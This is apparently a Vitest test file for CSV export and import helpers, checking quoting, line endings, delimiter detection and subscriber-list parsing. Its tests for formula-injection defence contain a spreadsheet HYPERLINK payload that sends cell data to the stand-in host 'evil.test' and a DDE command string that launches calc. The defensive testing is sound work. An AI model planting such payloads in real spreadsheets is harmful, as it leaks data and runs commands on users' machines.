import { describe, expect, it } from "vitest";
import { escapeCsvCell, parseCsv, parseSubscriberCsv, toCsv } from "./csv";

describe("escapeCsvCell", () => {
  it("quotes every cell and doubles embedded quotes", () => {
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""');
  });
  it("keeps commas and newlines inside the quotes", () => {
    expect(escapeCsvCell("a,b\nc")).toBe('"a,b\nc"');
  });
  it.each(["=1+1", "+1", "-1", "@SUM(A1)", "\t=1", "\r=1"])("neutralises formula starting %j", (v) => {
    expect(escapeCsvCell(v).startsWith(`"'`)).toBe(true);
  });
  it("neutralises the classic exfiltration payload", () => {
    expect(escapeCsvCell('=HYPERLINK("http://evil.test/?d="&A1,"click")')).toBe(
      `"'=HYPERLINK(""http://evil.test/?d=""&A1,""click"")"`,
    );
  });
  it("only prefixes when the formula character is first", () => {
    expect(escapeCsvCell("a=b")).toBe('"a=b"');
    expect(escapeCsvCell("hello-world")).toBe('"hello-world"');
  });
  it("handles null, undefined and numbers", () => {
    expect(escapeCsvCell(null)).toBe('""');
    expect(escapeCsvCell(undefined)).toBe('""');
    expect(escapeCsvCell(5)).toBe('"5"');
  });
});

describe("toCsv", () => {
  it("writes a BOM, CRLF line endings and escapes the Form column too (it used to only escape the last one)", () => {
    const csv = toCsv(["Form", "Email"], [['My "Form"', "a@b.co"]]);
    expect(csv).toBe('\uFEFF"Form","Email"\r\n"My ""Form""","a@b.co"\r\n');
  });
  it("keeps non-Latin text intact", () => {
    expect(toCsv(["Name"], [["مرحبا"]])).toContain("مرحبا");
  });
});

describe("parseCsv", () => {
  it("round-trips what toCsv writes, including quotes and newlines", () => {
    const rows = [
      ["Form", "Notes"],
      ['He said "hi"', "line1\nline2, with comma"],
    ];
    expect(parseCsv(toCsv(rows[0], [rows[1]]))).toEqual(rows);
  });
  it("accepts LF, CRLF and CR, and a BOM", () => {
    expect(parseCsv("\uFEFFa,b\r\nc,d\ne,f\rg,h")).toEqual([["a", "b"], ["c", "d"], ["e", "f"], ["g", "h"]]);
  });
  it("detects semicolon and tab delimiters", () => {
    expect(parseCsv("a;b\nc;d")).toEqual([["a", "b"], ["c", "d"]]);
    expect(parseCsv("a\tb\nc\td")).toEqual([["a", "b"], ["c", "d"]]);
  });
  it("does not split on a delimiter inside quotes", () => {
    expect(parseCsv('"a,b",c')).toEqual([["a,b", "c"]]);
  });
  it("skips blank lines and copes with a missing final newline", () => {
    expect(parseCsv("a,b\n\n\nc,d")).toEqual([["a", "b"], ["c", "d"]]);
  });
  it("returns nothing for empty input", () => {
    expect(parseCsv("")).toEqual([]);
  });
});

describe("parseSubscriberCsv", () => {
  it("reads email and name columns in any order and normalises addresses", () => {
    const r = parseSubscriberCsv("Name,Email\nSam,  SAM@Example.com \nAmy,amy@example.com");
    expect(r.valid).toEqual([
      { email: "sam@example.com", name: "Sam" },
      { email: "amy@example.com", name: "Amy" },
    ]);
  });
  it("works with only an email column and derives a name", () => {
    expect(parseSubscriberCsv("email\njo@example.com").valid).toEqual([{ email: "jo@example.com", name: "jo" }]);
  });
  it("works without a header row", () => {
    const r = parseSubscriberCsv("jo@example.com,Jo\nal@example.com");
    expect(r.valid).toEqual([
      { email: "jo@example.com", name: "Jo" },
      { email: "al@example.com", name: "al" },
    ]);
  });
  it("reports invalid and duplicate rows instead of silently dropping them", () => {
    const r = parseSubscriberCsv("email\nok@example.com\nnot-an-email\nOK@example.com\n=cmd|' /C calc'!A0");
    expect(r.valid).toHaveLength(1);
    expect(r.duplicates).toBe(1);
    expect(r.invalid).toEqual(["not-an-email", "=cmd|' /c calc'!a0"]);
  });
  it("handles an empty file", () => {
    expect(parseSubscriberCsv("")).toEqual({ valid: [], invalid: [], duplicates: 0 });
  });
});
